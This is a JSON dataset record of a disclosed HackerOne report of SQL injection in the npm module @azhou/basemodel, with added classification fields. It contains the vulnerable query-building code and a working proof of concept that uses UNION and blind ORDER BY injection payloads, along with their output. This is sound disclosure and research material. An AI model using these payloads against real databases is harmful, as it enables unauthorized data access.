@@ -1,0 +1,45 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "verichains ",
+  "title": "[@azhou/basemodel] SQL injection",
+  "content": "\nI would like to report SQL injection in @azhou/basemodel\nIt allows attacker to read data from database.\nModule\nmodule name: @azhou/basemodel\nversion: 1.0.0\nnpm page: https://www.npmjs.com/package/@azhou/basemodel\nModule Description\nUsage\nInitialization\nCode 59 Bytes\n1var model = require(\"@azhou/basemodel\")(tableName, fields);\nwhere tableName is the name of the data table and fields refers to the field list, either using comma connected string or array.\nExample:\nCode 241 Bytes\n1// Initialize database\n2var db = require(\"@azhou/mysql-wrapper\");\n3db.init(\"server\", \"database\", \"username\", \"password\");\n4\n5// Create basic CRUD data model\n6var model = require(\"@azhou/basemodel\")(\"table\", [ \"field1\", \"field2\", \"field3\", ... ]);\nNotice when defining fields, id should not implicitly added and should not be contained in the field list\nIf validation is required, function validate() that returns boolean can be added to model:\nCode 42 Bytes\n1model.validate = function (source) { ... }\nCRUD Functions\nCreate Object\nCode 20 Bytes\n1model.create(source)\nsource is the source object\nExample:\nCode 79 Bytes\n1model.create({ name: 'John Doe', value: 123.456 }).then(function (id) { ... });\nRead Object by ID\nCode 25 Bytes\n1model.getById(id, fields)\nfields is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.\nExamples:\nCode 118 Bytes\n1model.getById(123).then(function (obj) { ... });\n2model.getById(456, [ \"name\", \"value\" ]).then(function (obj) { ... });\nRead Object by Name\nCode 29 Bytes\n1model.getByName(name, fields)\nfields is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.\nRead All Objects\nCode 29 Bytes\n1model.getAll(fields, orderby)\nfields is optional, which is an array of field list you want to return in the result. If missing or incorrect type, default field list is used.\norderby is an optional string argument which defines the ordering of the returned list.\nExamples:\nCode 194 Bytes\n1model.getAll(\"name\").then(function (list) { ... });\n2model.getAll([ \"name\", \"value\" ]).then(function (list) { ... });\n3model.getAll([ \"name\", \"value\" ], \"name DESC\").then(function (list) { ... });\nRead Objects by ID list\nThere are four different of formats:\nmodel.getAllByIds(ids)\nmodel.getAllByIds(ids, fields)\nmodel.getAllByIds(objects, nameOfIdField)\nmodel.getAllByIds(objects, nameOfIdField, fields)\nExamples:\nCode 293 Bytes\n1model.getAllByIds([ 1, 2, 3 ]).then(function (list) { ... });\n2model.getAllByIds([ 1, 2, 3 ], [ \"name\", \"value\" ]).then(function (list) { ... });\n3model.getAllByIds(objects, \"id\").then(function (list) { ... });\n4model.getAllByIds(objects, \"id\", [ \"name\", \"value\" ]).then(function (list) { ... });\nUpdate Object\nCode 24 Bytes\n1model.update(id, source)\nExample:\nCode 68 Bytes\n1model.update(123, { name: \"Mike Smith\" }).then(function () { ... });\nDelete Object\nCode 16 Bytes\n1model.delete(id)\nModule Stats\n8 downloads in the last month\nVulnerability\nVulnerability Description\nAll table names and fields arguments of all methods are fed directly into query by string concatenation without escaping which may lead to sql injection.\nOrder by field of model.getAll(fields, orderby) is not escaped and directly used in query which lead to blind sql injection:\nCode 438 Bytes\n1\tmodel.getAll = function (fields, orderby) {\n2\t\tif (typeof fields == 'string') {\n3\t\t\torderby = fields;\n4\t\t\tfields = allFields;\n5\t\t} else if (Array.isArray(fields) && (typeof orderby == 'string' || !orderby)) {\n6\t\t\tif (fields.length == 0)\n7\t\t\t\tfields = allFields;\n8\t\t} else {\n9\t\t\tfields = allFields;\n10\t\t\torderby = \"\";\n11\t\t}\n12\n13\t\treturn db.query(\"SELECT id,\" + fields.join(\",\") + \" FROM `\" + table + \"`\"\n14\t\t\t+ (orderby ? \" ORDER BY \" + orderby : \"\"));\n15\t}\nSteps To Reproduce:\nExample POC:\nCode 878 Bytes\n1var db = require(\"@azhou/mysql-wrapper\");\n2db.init(\"localhost\", \"mysql\", \"root\", \"\");\n3\n4(async () => {\n5\tawait db.query(\"CREATE TABLE IF NOT EXISTS test(id int not null PRIMARY KEY AUTO_INCREMENT, ckey varchar(255), cvalue varchar(255));\");\n6\tawait db.query(\"TRUNCATE TABLE test;\");\n7\n8\tvar model = require(\"@azhou/basemodel\")(\"test\", [\"ckey\",\"cvalue\"]);\n9\t\n10\tfor(var i=0;i<10;i++)\n11\t\tawait model.create({ckey: `k${i}`, cvalue: `v${i}`});\n12\t\n13\tconsole.log('- get all (normal)');\n14\tconsole.log(await model.getAll([\"ckey\", \"cvalue\"]))\n15\n16\tconsole.log('- get all (sqli)');\n17\tconsole.log(await model.getAll([\"ckey\", \"cvalue from test where 1=0 union all select 0, 'sqli','sqli'#\"]))\n18\n19\tconsole.log('- get all (bsqli in order by)');\n20\tconsole.log(await model.getAll([\"ckey\", \"cvalue\"], 'IF(1=1, id, -id) LIMIT 1'))\n21\tconsole.log(await model.getAll([\"ckey\", \"cvalue\"], 'IF(1=0, id, -id) LIMIT 1'))\n22})()\nOutput\nCode 764 Bytes\n1- get all (normal)\n2[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' },\n3  RowDataPacket { id: 2, ckey: 'k1', cvalue: 'v1' },\n4  RowDataPacket { id: 3, ckey: 'k2', cvalue: 'v2' },\n5  RowDataPacket { id: 4, ckey: 'k3', cvalue: 'v3' },\n6  RowDataPacket { id: 5, ckey: 'k4', cvalue: 'v4' },\n7  RowDataPacket { id: 6, ckey: 'k5', cvalue: 'v5' },\n8  RowDataPacket { id: 7, ckey: 'k6', cvalue: 'v6' },\n9  RowDataPacket { id: 8, ckey: 'k7', cvalue: 'v7' },\n10  RowDataPacket { id: 9, ckey: 'k8', cvalue: 'v8' },\n11  RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]\n12- get all (sqli)\n13[ RowDataPacket { id: 0, ckey: 'sqli', cvalue: 'sqli' } ]\n14- get all (bsqli in order by)\n15[ RowDataPacket { id: 1, ckey: 'k0', cvalue: 'v0' } ]\n16[ RowDataPacket { id: 10, ckey: 'k9', cvalue: 'v9' } ]\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nMacOS\n8.12.0\n6.4.1\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAllow attackers to query database if they have access to orderBy variable and to perform any query type if have access to table or column variable.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1580702400,
+  "report_url": "https://hackerone.com/reports/506644",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Initialize the database and create a test table with sample data using @azhou/mysql-wrapper and @azhou/basemodel."
+    ],
+    [
+      2,
+      "Execute model.getAll() with malicious input in the fields or orderby parameters to demonstrate SQL injection."
+    ]
+  ],
+  "vuln_description": "The @azhou/basemodel module is vulnerable to SQL injection due to direct concatenation of user-supplied input (table names, fields, and orderby clauses) into SQL queries without proper escaping. This allows attackers to manipulate queries to read unauthorized data or perform other SQL operations.",
+  "reason": "The vulnerability is straightforward to exploit as it involves basic SQL injection techniques through direct input manipulation in commonly used CRUD operations. The attack does not require complex application state manipulation or understanding of subtle interactions between components.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability in @azhou/basemodel involves direct string concatenation of user-supplied input into SQL queries without proper escaping. This is not an authentication or authorization issue but rather an input validation and sanitization issue. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are different from SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
